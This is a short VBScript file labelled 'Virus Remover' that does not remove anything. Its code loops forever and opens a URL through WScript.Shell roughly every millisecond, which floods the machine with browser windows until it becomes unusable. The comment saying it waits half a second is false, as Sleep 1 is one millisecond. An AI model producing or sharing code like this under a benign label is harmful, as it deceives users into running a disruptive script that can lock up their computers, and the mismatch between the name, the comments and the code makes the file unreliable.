' Virus Remover VBScript
Set oShell = CreateObject("WScript.Shell")

' This loop has no condition to stop, so it will run forever.
Do
    ' Change the URL to whatever you want
    oShell.Run("https://www.example.com")
    ' Wait half a second before opening the next one
    WScript.Sleep 1
Loop